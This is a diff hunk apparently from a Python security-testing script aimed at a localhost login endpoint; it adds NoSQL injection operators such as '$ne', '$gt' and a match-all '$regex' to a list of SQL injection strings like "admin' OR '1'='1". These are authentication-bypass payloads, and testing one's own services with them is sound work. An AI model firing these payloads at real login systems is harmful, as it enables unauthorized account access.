@@ -3,6 +3,11 @@ import requests
 URL = "https://localhost:8080/api/users/login/psw"
 
 payloads = [
+'{"$ne": null}',
+    '{"$ne": ""}',
+    '{"$gt": ""}',
+    '{"$regex": ".*"}',
+    '{"$in": ["admin", "root"]}',
     "admin' OR '1'='1",
     "admin' OR '1'='1' --",
     "admin' OR '1'='1' /*",
